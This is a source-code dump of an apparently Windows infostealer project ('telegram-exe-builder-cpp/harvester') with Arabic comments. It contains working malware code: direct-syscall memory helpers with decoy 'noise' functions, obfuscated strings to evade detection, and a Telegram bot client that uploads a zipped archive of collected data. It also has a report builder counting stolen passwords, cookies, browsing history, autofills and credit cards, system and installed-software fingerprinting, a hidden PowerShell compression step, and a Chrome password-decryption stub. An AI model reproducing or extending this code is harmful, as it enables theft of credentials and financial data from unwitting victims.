+// دوال مساعدة لتخصيص الذاكرة وتغيير الحماية باستخدام السيسكولات
+// -------------------------------------------------------------------
+NTSTATUS SyscallAllocateMemory(HANDLE hProcess, PVOID* baseAddr, SIZE_T regionSize,
+                               DWORD allocationType, DWORD protect);
+
+NTSTATUS SyscallProtectMemory(HANDLE hProcess, PVOID* baseAddr, PSIZE_T regionSize,
+                              DWORD newProtect, PDWORD oldProtect);
+
+// -------------------------------------------------------------------
+// دوال وهمية لإضافة ضجيج
+// -------------------------------------------------------------------
+void DummySyscallFunction1();
+void DummySyscallFunction2();
+
+// -------------------------------------------------------------------
+// تهيئة الجداول الداخلية (تستدعى تلقائياً)
+// -------------------------------------------------------------------
+void InitSyscalls();
+
+================================================================================
+FILE: harvester\exfil\telegram_client.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\exfil\telegram_client.cpp
+================================================================================
+// telegram_client.cpp – نسخة معتمدة كلياً على GetObfuscatedString (بدون رسائل واضحة)
+#include "telegram_client.h"
+#include "../crypto/obfuscation.h"
+#include <windows.h>
+#include <wininet.h>
+#include <string>
+#include <fstream>
+#include <vector>
+
+#pragma comment(lib, "wininet.lib")
+
+// دالة مساعدة (تكتب خطأ في ملف إذا أردت، لكن لا نستخدم سلاسل نصية واضحة)
+static void LogError(const std::string& msg) {
+    // يمكن تركها فارغة أو تعطيلها تماماً في الإصدار النهائي
+    // لتجنب ظهور أي نصوص، لا نطبع أي شيء.
+    (void)msg; // unused
+}
+
+bool SendToTelegram(const std::string& filePath, const std::string& botToken, const std::string& chatId) {
+    // استرجاع السلاسل المشفرة
+    std::string apiHost = GetObfuscatedString(STR_API_TELEGRAM);        // "api.telegram.org"
+    std::string botPath = GetObfuscatedString(STR_BOT_TOKEN_PLACE);     // "/bot"
+    std::string sendDocPath = GetObfuscatedString(STR_SEND_DOCUMENT);   // "/sendDocument"
+    std::string userAgent = GetObfuscatedString(STR_USER_AGENT);        // "Mozilla/5.0 ..."
+    std::string boundaryPrefix = GetObfuscatedString(STR_MULTIPART_BOUNDARY); // "----"
+    std::string chatDisposition = GetObfuscatedString(STR_CONTENT_DISPOSITION_CHAT); // "Content-Disposition: form-data; name=\"chat_id\""
+    std::string docDisposition = GetObfuscatedString(STR_CONTENT_DISPOSITION_DOC);   // "Content-Disposition: form-data; name=\"document\"; filename=\"data.zip\""
+    std::string contentTypeZip = GetObfuscatedString(STR_CONTENT_TYPE_ZIP);          // "application/zip"
+    
+    const int MAX_RETRIES = 3;
+    for (int attempt = 1; attempt <= MAX_RETRIES; attempt++) {
+        // قراءة الملف
+        std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+        if (!file.is_open()) {
+            // لا نكتب رسالة خطأ نصية واضحة
+            continue;
+        }
+        std::streamsize fileSize = file.tellg();
+        file.seekg(0, std::ios::beg);
+        std::vector<char> fileData(fileSize);
+        if (!file.read(fileData.data(), fileSize)) {
+            continue;
+        }
+        file.close();
+
+        // بناء multipart/form-data (باستخدام السلاسل المشفرة)
+        std::string boundary = boundaryPrefix + std::to_string(GetCurrentProcessId()) + std::to_string(attempt);
+        std::string bodyStart;
+        bodyStart += "--" + boundary + "\r\n";
+        bodyStart += chatDisposition + "\r\n\r\n";
+        bodyStart += chatId + "\r\n";
+        bodyStart += "--" + boundary + "\r\n";
+        bodyStart += docDisposition + "\r\n";
+        bodyStart += "Content-Type: " + contentTypeZip + "\r\n\r\n";
+
+        std::string bodyEnd = "\r\n--" + boundary + "--\r\n";
+        std::string fullBody = bodyStart + std::string(fileData.data(), fileData.size()) + bodyEnd;
+
+        // إعداد الاتصال
+        HINTERNET hSession = InternetOpenA(userAgent.c_str(),
+                                            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (!hSession) {
+            continue;
+        }
+
+        HINTERNET hConnect = InternetConnectA(hSession, apiHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT,
+                                              NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (!hConnect) {
+            InternetCloseHandle(hSession);
+            continue;
+        }
+
+        std::string path = botPath + botToken + sendDocPath;
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL,
+                                              INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+        if (!hRequest) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hSession);
+            continue;
+        }
+
+        std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary;
+        BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), headers.size(),
+                                     (LPVOID)fullBody.c_str(), fullBody.size());
+
+        // قراءة الرد (يمكن تجاهله، أو فحصه بدون طباعة نصوص واضحة)
+        char buffer[1024];
+        DWORD bytesRead;
+        std::string response;
+        if (sent) {
+            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+                buffer[bytesRead] = '\0';
+                response += buffer;
+            }
+        }
+
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hSession);
+
+        // التحقق من وجود "\"ok\":true" في الرد (نستخدم strstr بدلاً من find لتجنب ظهور نص "ok":true في الكود؟ لكن النص "ok":true لا يظهر في الكود مباشرة، بل في response. لكن response قد تحتويه. نحن لا نطبعها، لذا آمن. نكتفي بالتحقق.
+        if (sent && response.find("\"ok\":true") != std::string::npos) {
+            return true;
+        }
+        // نوم بسيط قبل إعادة المحاولة (لا نستخدم رسالة نصية واضحة)
+        Sleep(2000 * attempt);
+    }
+    return false;
+}
+
+================================================================================
+FILE: harvester\exfil\telegram_client.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\exfil\telegram_client.h
+================================================================================
+// telegram_client.h
+#pragma once
+#include <string>
+
+// إرسال ملف إلى بوت Telegram عبر واجهة sendDocument
+// ترجع true إذا نجح الإرسال
+bool SendToTelegram(const std::string& filePath, const std::string& botToken, const std::string& chatId);
+
+================================================================================
+FILE: harvester\report\report_builder.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\report\report_builder.cpp
+================================================================================
+// harvester/report/report_builder.cpp
+#include "report_builder.h"
+#include "../crypto/obfuscation.h"
+#include <fstream>
+#include <sstream>
+#include <iomanip>
+#include <algorithm>
+
+static std::string escapeHtml(const std::string& s) {
+    std::string result;
+    for (char c : s) {
+        if (c == '<') result += "&lt;";
+        else if (c == '>') result += "&gt;";
+        else if (c == '&') result += "&amp;";
+        else if (c == '"') result += "&quot;";
+        else result += c;
+    }
+    return result;
+}
+
+void BuildReport(const SystemInfo& sysInfo,
+                 const std::vector<DetectedApp>& detectedApps,
+                 const CollectedStats& stats,
+                 const std::string& outputDir) {
+    std::string reportPath = outputDir + "\\" + GetObfuscatedString(STR_REPORT_HTML); // "report.html"
+    std::ofstream out(reportPath);
+    if (!out.is_open()) return;
+
+    // HTML template (بسيط وأنيق)
+    out << "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>System Report</title>";
+    out << "<style>body{font-family:Consolas,monospace;background:#1e1e2f;color:#cdd6f4;padding:20px;}";
+    out << ".section{background:#313244;margin:10px 0;padding:10px;border-radius:8px;}";
+    out << "h1{color:#89b4fa;}h2{color:#a6e3a1;}table{width:100%;border-collapse:collapse;}";
+    out << "td,th{border:1px solid #45475a;padding:8px;text-align:left;}th{background:#45475a;}";
+    out << ".badge{background:#89b4fa;color:#1e1e2f;padding:2px 6px;border-radius:4px;}</style>";
+    out << "</head><body>";
+
+    out << "<h1>" << GetObfuscatedString(STR_PC_USER_INFORMATION) << "</h1>";
+    out << "<div class=\"section\"><table>";
+    out << "<tr><th>" << GetObfuscatedString(STR_IP_ADDRESS) << "</th><td>" << escapeHtml(sysInfo.ipAddress) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_COMPUTER_NAME) << "</th><td>" << escapeHtml(sysInfo.computerName) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_USER_NAME) << "</th><td>" << escapeHtml(sysInfo.userName) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_OS_VERSION) << "</th><td>" << escapeHtml(sysInfo.osVersion) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_ARCHITECTURE) << "</th><td>" << escapeHtml(sysInfo.architecture) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_RAM) << "</th><td>" << escapeHtml(sysInfo.ram) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_CPU) << "</th><td>" << escapeHtml(sysInfo.cpu) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_GPU) << "</th><td>" << escapeHtml(sysInfo.gpu) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_LANGUAGE) << "</th><td>" << escapeHtml(sysInfo.language) << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_TIMEZONE) << "</th><td>" << escapeHtml(sysInfo.timezone) << "</td></tr>";
+    out << "</table></div>";
+
+    out << "<h1>" << GetObfuscatedString(STR_BASIC_INFORMATION) << "</h1>";
+    out << "<div class=\"section\"><table>";
+    out << "<tr><th>" << GetObfuscatedString(STR_PASSWORDS_COUNT) << "</th><td>" << stats.passwordsCount << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_COOKIES_COUNT) << "</th><td>" << stats.cookiesCount << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_HISTORY_COUNT) << "</th><td>" << stats.historyCount << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_AUTOFILLS_COUNT) << "</th><td>" << stats.autofillsCount << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_CC_COUNT) << "</th><td>" << stats.creditCardsCount << "</td></tr>";
+    out << "<tr><th>" << GetObfuscatedString(STR_GRABBED_FILES_COUNT) << "</th><td>" << stats.grabbedFilesCount << "</td></tr>";
+    out << "</table></div>";
+
+    out << "<h1>" << GetObfuscatedString(STR_GRABBED_SOFTWARE) << "</h1>";
+    out << "<div class=\"section\"><ul>";
+    for (const auto& app : detectedApps) {
+        out << "<li>" << (app.found ? "✅ " : "❌ ") << escapeHtml(app.name) << "</li>";
+    }
+    out << "</ul></div>";
+
+    if (!stats.domains.empty()) {
+        out << "<h1>" << GetObfuscatedString(STR_DOMAINS_DETECTED) << "</h1>";
+        out << "<div class=\"section\"><ul>";
+        for (const auto& domain : stats.domains) {
+            out << "<li>" << escapeHtml(domain) << "</li>";
+        }
+        out << "</ul></div>";
+    }
+
+    out << "</body></html>";
+    out.close();
+}
+
+================================================================================
+FILE: harvester\report\report_builder.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\report\report_builder.h
+================================================================================
+// harvester/report/report_builder.h
+#pragma once
+
+#include <string>
+#include <vector>
+#include "../system/system_info.h"
+#include "../collectors/app_detector.h"
+
+// بنية لإحصائيات البيانات المجمعة (سيتم ملؤها من collector لاحقاً)
+struct CollectedStats {
+    int passwordsCount;      // عدد كلمات المرور المستخرجة
+    int cookiesCount;        // عدد ملفات تعريف الارتباط
+    int historyCount;        // عدد سجلات التصفح
+    int autofillsCount;      // عدد إدخالات الملء التلقائي
+    int creditCardsCount;    // عدد بطاقات الائتمان (0 حالياً)
+    int grabbedFilesCount;   // عدد الملفات الملتقطة (0 حالياً)
+    std::vector<std::string> domains; // أسماء النطاقات المستخرجة من التاريخ
+};
+
+// بناء التقرير النهائي (HTML) وحفظه في outputDir
+void BuildReport(const SystemInfo& sysInfo,
+                 const std::vector<DetectedApp>& detectedApps,
+                 const CollectedStats& stats,
+                 const std::string& outputDir);
+
+================================================================================
+FILE: harvester\system\system_info.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\system\system_info.cpp
+================================================================================
+// harvester/system/system_info.cpp
+// تنفيذ دوال جمع معلومات النظام (نسخة مصححة)
+#include "system_info.h"
+#include "../crypto/obfuscation.h"
+#include <windows.h>
+#include <wininet.h>
+#include <comdef.h>
+#include <Wbemidl.h>
+#include <string>
+#include <sstream>
+#include <fstream>
+#include <vector>
+#include <algorithm>
+#include <cctype>
+
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "wbemuuid.lib")
+
+// دالة مساعدة لتحويل wide string إلى string
+static std::string WStringToString(const std::wstring& wstr) {
+    if (wstr.empty()) return "";
+    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (len <= 0) return "";
+    std::string result(len - 1, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, NULL, NULL);
+    return result;
+}
+
+// دالة مساعدة لقراءة قيمة من الريجستري (string)
+static std::string GetRegistryString(HKEY hKeyRoot, const std::string& subKey, const std::string& valueName) {
+    HKEY hKey;
+    if (RegOpenKeyExA(hKeyRoot, subKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+        return "";
+    char buffer[1024];
+    DWORD size = sizeof(buffer);
+    DWORD type;
+    if (RegQueryValueExA(hKey, valueName.c_str(), NULL, &type, (LPBYTE)buffer, &size) != ERROR_SUCCESS || type != REG_SZ) {
+        RegCloseKey(hKey);
+        return "";
+    }
+    RegCloseKey(hKey);
+    return std::string(buffer);
+}
+
+// الحصول على عنوان IP العام عبر HTTP
+std::string GetPublicIP() {
+    std::string apiURL = GetObfuscatedString(STR_IP_API_URL);     // "https://api.ipify.org"
+    HINTERNET hSession = InternetOpenA(GetObfuscatedString(STR_USER_AGENT).c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hSession) return "";
+    HINTERNET hConnect = InternetOpenUrlA(hSession, apiURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hSession);
+        return "";
+    }
+    char buffer[128];
+    DWORD bytesRead;
+    std::string ip;
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        ip += buffer;
+    }
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hSession);
+    // إزالة whitespace
+    ip.erase(remove_if(ip.begin(), ip.end(), ::isspace), ip.end());
+    return ip;
+}
+
+// الحصول على اسم المعالج عبر WMI
+static std::string GetCPUName() {
+    std::string cpuName = "Unknown";
+    HRESULT hres;
+    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+    if (FAILED(hres)) return cpuName;
+    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    IWbemLocator* pLoc = NULL;
+    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
+    if (SUCCEEDED(hres)) {
+        IWbemServices* pSvc = NULL;
+        // استخدم 0 بدلاً من NULL للمعامل LONG
+        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, 0, NULL, 0, &pSvc);
+        if (SUCCEEDED(hres)) {
+            hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+            IEnumWbemClassObject* pEnumerator = NULL;
+            hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT Name FROM Win32_Processor"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
+            if (SUCCEEDED(hres)) {
+                IWbemClassObject* pclsObj = NULL;
+                ULONG uReturn = 0;
+                while (pEnumerator) {
+                    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+                    if (uReturn == 0) break;
+                    VARIANT vtProp;
+                    hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
+                    if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR) {
+                        cpuName = WStringToString(vtProp.bstrVal);
+                        VariantClear(&vtProp);
+                    }
+                    pclsObj->Release();
+                }
+                pEnumerator->Release();
+            }
+            pSvc->Release();
+        }
+        pLoc->Release();
+    }
+    CoUninitialize();
+    return cpuName;
+}
+
+// الحصول على حجم الذاكرة العشوائية
+static std::string GetRAMSize() {
+    MEMORYSTATUSEX mem;
+    mem.dwLength = sizeof(mem);
+    GlobalMemoryStatusEx(&mem);
+    unsigned long long totalMB = mem.ullTotalPhys / (1024 * 1024);
+    unsigned long long totalGB = totalMB / 1024;
+    if (totalGB > 0)
+        return std::to_string(totalGB) + " GB";
+    else
+        return std::to_string(totalMB) + " MB";
+}
+
+// الحصول على اسم بطاقة الرسومات (اختياري)
+static std::string GetGPUName() {
+    std::string gpuName = "Unknown";
+    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+    if (FAILED(hres)) return gpuName;
+    IWbemLocator* pLoc = NULL;
+    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
+    if (SUCCEEDED(hres)) {
+        IWbemServices* pSvc = NULL;
+        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, 0, NULL, 0, &pSvc);
+        if (SUCCEEDED(hres)) {
+            hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+            IEnumWbemClassObject* pEnumerator = NULL;
+            hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT Name FROM Win32_VideoController"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
+            if (SUCCEEDED(hres)) {
+                IWbemClassObject* pclsObj = NULL;
+                ULONG uReturn = 0;
+                while (pEnumerator) {
+                    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+                    if (uReturn == 0) break;
+                    VARIANT vtProp;
+                    hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
+                    if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR) {
+                        gpuName = WStringToString(vtProp.bstrVal);
+                        VariantClear(&vtProp);
+                        pclsObj->Release();
+                        break;
+                    }
+                    pclsObj->Release();
+                }
+                pEnumerator->Release();
+            }
+            pSvc->Release();
+        }
+        pLoc->Release();
+    }
+    CoUninitialize();
+    return gpuName;
+}
+
+// قائمة البرامج المثبتة من الريجستري
+std::vector<std::string> GetInstalledSoftware() {
+    std::vector<std::string> software;
+    HKEY hKey;
+    std::string uninstallPath = GetObfuscatedString(STR_REG_UNINSTALL);
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, uninstallPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD index = 0;
+        char subKeyName[256];
+        DWORD size;
+        while (true) {
+            size = sizeof(subKeyName);
+            if (RegEnumKeyExA(hKey, index, subKeyName, &size, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
+                break;
+            std::string fullPath = uninstallPath + "\\" + subKeyName;
+            HKEY hSubKey;
+            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+                char displayName[256];
+                DWORD bufSize = sizeof(displayName);
+                DWORD type;
+                if (RegQueryValueExA(hSubKey, "DisplayName", NULL, &type, (LPBYTE)displayName, &bufSize) == ERROR_SUCCESS && type == REG_SZ) {
+                    software.push_back(displayName);
+                }
+                RegCloseKey(hSubKey);
+            }
+            index++;
+        }
+        RegCloseKey(hKey);
+    }
+    // WOW6432Node للبرامج 32-bit على نظام 64-bit
+    std::string uninstallPathWow = GetObfuscatedString(STR_REG_UNINSTALL_WOW64);
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, uninstallPathWow.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD index = 0;
+        char subKeyName[256];
+        DWORD size;
+        while (true) {
+            size = sizeof(subKeyName);
+            if (RegEnumKeyExA(hKey, index, subKeyName, &size, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
+                break;
+            std::string fullPath = uninstallPathWow + "\\" + subKeyName;
+            HKEY hSubKey;
+            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+                char displayName[256];
+                DWORD bufSize = sizeof(displayName);
+                DWORD type;
+                if (RegQueryValueExA(hSubKey, "DisplayName", NULL, &type, (LPBYTE)displayName, &bufSize) == ERROR_SUCCESS && type == REG_SZ) {
+                    software.push_back(displayName);
+                }
+                RegCloseKey(hSubKey);
+            }
+            index++;
+        }
+        RegCloseKey(hKey);
+    }
+    return software;
+}
+
+// جمع كل معلومات النظام
+SystemInfo CollectSystemInfo() {
+    SystemInfo info;
+    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(computerName);
+    if (GetComputerNameA(computerName, &size))
+        info.computerName = computerName;
+    else
+        info.computerName = "Unknown";
+    
+    char userName[256];
+    DWORD userSize = sizeof(userName);
+    if (GetUserNameA(userName, &userSize))
+        info.userName = userName;
+    else
+        info.userName = "Unknown";
+    
+    // نظام التشغيل – بسيط عبر GetVersionEx أو ريجستري
+    info.osVersion = GetRegistryString(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
+    if (info.osVersion.empty()) info.osVersion = "Windows";
+    
+    // العمارة – عبر GetNativeSystemInfo
+    SYSTEM_INFO sysInfo;
+    GetNativeSystemInfo(&sysInfo);
+    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
+        info.architecture = "x64";
+    else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
+        info.architecture = "x86";
+    else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
+        info.architecture = "ARM64";
+    else
+        info.architecture = "Unknown";
+    
+    info.ram = GetRAMSize();
+    info.cpu = GetCPUName();
+    info.gpu = GetGPUName();
+    
+    // اللغة – استخدم GetUserDefaultUILanguage مع تحويل إلى char* عبر WideCharToMultiByte
+    LCID lcid = GetUserDefaultUILanguage();
+    wchar_t localeNameW[LOCALE_NAME_MAX_LENGTH];
+    if (LCIDToLocaleName(lcid, localeNameW, LOCALE_NAME_MAX_LENGTH, 0)) {
+        int len = WideCharToMultiByte(CP_UTF8, 0, localeNameW, -1, NULL, 0, NULL, NULL);
+        if (len > 0) {
+            std::vector<char> localeNameA(len);
+            WideCharToMultiByte(CP_UTF8, 0, localeNameW, -1, localeNameA.data(), len, NULL, NULL);
+            info.language = localeNameA.data();
+        } else {
+            info.language = "en-US";
+        }
+    } else {
+        info.language = "en-US";
+    }
+    
+    // المنطقة الزمنية
+    TIME_ZONE_INFORMATION tz;
+    GetTimeZoneInformation(&tz);
+    char tzName[256];
+    WideCharToMultiByte(CP_UTF8, 0, tz.StandardName, -1, tzName, sizeof(tzName), NULL, NULL);
+    info.timezone = tzName;
+    
+    info.ipAddress = GetPublicIP();
+    info.installedSoftware = GetInstalledSoftware();
+    
+    return info;
+}
+
+// حفظ معلومات النظام في ملف نصي
+void SaveSystemInfoToFile(const SystemInfo& info, const std::string& outputDir) {
+    std::string filePath = outputDir + "\\" + GetObfuscatedString(STR_SYSTEM_TXT); // "system_info.txt"
+    std::ofstream out(filePath);
+    if (!out.is_open()) return;
+    
+    out << GetObfuscatedString(STR_PC_USER_INFORMATION) << ":" << std::endl;
+    out << "- " << GetObfuscatedString(STR_IP_ADDRESS) << ": " << info.ipAddress << std::endl;
+    out << "- " << GetObfuscatedString(STR_COMPUTER_NAME) << ": " << info.computerName << std::endl;
+    out << "- " << GetObfuscatedString(STR_USER_NAME) << ": " << info.userName << std::endl;
+    out << "- " << GetObfuscatedString(STR_OS_VERSION) << ": " << info.osVersion << std::endl;
+    out << "- " << GetObfuscatedString(STR_ARCHITECTURE) << ": " << info.architecture << std::endl;
+    out << "- " << GetObfuscatedString(STR_RAM) << ": " << info.ram << std::endl;
+    out << "- " << GetObfuscatedString(STR_CPU) << ": " << info.cpu << std::endl;
+    out << "- " << GetObfuscatedString(STR_GPU) << ": " << info.gpu << std::endl;
+    out << "- " << GetObfuscatedString(STR_LANGUAGE) << ": " << info.language << std::endl;
+    out << "- " << GetObfuscatedString(STR_TIMEZONE) << ": " << info.timezone << std::endl;
+    out << std::endl;
+    out << GetObfuscatedString(STR_INSTALLED_SOFTWARE) << " (" << info.installedSoftware.size() << "):" << std::endl;
+    for (const auto& sw : info.installedSoftware) {
+        out << "  - " << sw << std::endl;
+    }
+    out.close();
+}
+
+================================================================================
+FILE: harvester\system\system_info.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\system\system_info.h
+================================================================================
+// harvester/system/system_info.h
+// واجهة لجمع معلومات النظام والبرامج المثبتة
+#pragma once
+
+#include <string>
+#include <vector>
+
+// بنية لتخزين معلومات النظام
+struct SystemInfo {
+    std::string ipAddress;           // عنوان IP العام
+    std::string computerName;        // اسم الكمبيوتر
+    std::string userName;            // اسم المستخدم
+    std::string osVersion;           // نظام التشغيل (مثل Windows 11 Pro)
+    std::string architecture;        // x86, x64, ARM
+    std::string ram;                 // حجم الذاكرة (GB)
+    std::string cpu;                 // اسم المعالج
+    std::string gpu;                 // اسم بطاقة الرسومات (اختياري)
+    std::string language;            // اللغة (مثل en-US)
+    std::string timezone;            // المنطقة الزمنية
+    std::vector<std::string> installedSoftware; // قائمة البرامج المثبتة
+};
+
+// يجمع كل معلومات النظام (بما في ذلك IP العام)
+SystemInfo CollectSystemInfo();
+
+// يخزن معلومات النظام في ملف نصي بتنسيق readable (system_info.txt)
+void SaveSystemInfoToFile(const SystemInfo& info, const std::string& outputDir);
+
+// يعيد قائمة البرامج المثبتة من الريجستري
+std::vector<std::string> GetInstalledSoftware();
+
+// يحصل على عنوان IP العام (عبر api.ipify.org أو icanhazip.com)
+std::string GetPublicIP();
+
+================================================================================
+FILE: harvester\utils\decrypt_passwords.py.template.py
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\utils\decrypt_passwords.py.template.py
+================================================================================
+# decrypt_passwords.py
+import sqlite3
+import os
+import json
+import base64
+from Crypto.Cipher import AES
+import win32crypt
+
+def decrypt_chrome_password(encrypted, key):
+    # Simplified - full implementation requires AES-GCM
+    pass
+
+def main():
+    # سيتم تضمين هذا السكريبت في الملف المضغوط
+    print("Run this script on the machine where the data was collected.")
+    # ... كود كامل لفك التشفير
+
+if __name__ == "__main__":
+    main()
+
+================================================================================
+FILE: harvester\utils\zip_utils.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\utils\zip_utils.cpp
+================================================================================
+// zip_utils.cpp – ضغط المجلدات باستخدام PowerShell (بدون نصوص واضحة)
+#include "zip_utils.h"
+#include "../crypto/obfuscation.h"
+#include <windows.h>
+#include <string>
+
+bool ZipFolder(const std::string& folderPath, const std::string& zipFilePath) {
+    // بناء أمر PowerShell باستخدام السلاسل المشفرة
+    std::string cmdPart1 = GetObfuscatedString(STR_POWERSHELL_COMPRESS);  // "powershell -Command \"Compress-Archive -Path '"
+    std::string cmdPart2 = GetObfuscatedString(70);                        // "\\*' -DestinationPath '"
+    
+    // الأمر الكامل: powershell -Command "Compress-Archive -Path 'folder\*' -DestinationPath 'output.zip' -Force"
+    std::string cmd = cmdPart1 + folderPath + cmdPart2 + zipFilePath + "' -Force\"";
+    
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    
+    if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        return false;
+    }
+    
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    
+    DWORD attrs = GetFileAttributesA(zipFilePath.c_str());
+    return (attrs != INVALID_FILE_ATTRIBUTES);
+}
+
+================================================================================
+FILE: harvester\utils\zip_utils.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\utils\zip_utils.h
+================================================================================
+// zip_utils.h
+#pragma once
+#include <string>
+
+// يضغط مجلد بأكمله إلى ملف ZIP
+// folderPath: المجلد المراد ضغطه (مثل "C:\\temp\\collected_data")
+// zipFilePath: المسار الكامل لملف ZIP الناتج (مثل "C:\\temp\\output.zip")
+bool ZipFolder(const std::string& folderPath, const std::string& zipFilePath);
+
+================================================================================
+FILE: main.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\main.cpp
+================================================================================
+// main.cpp – نسخة تصحيح مع كتابة سجل
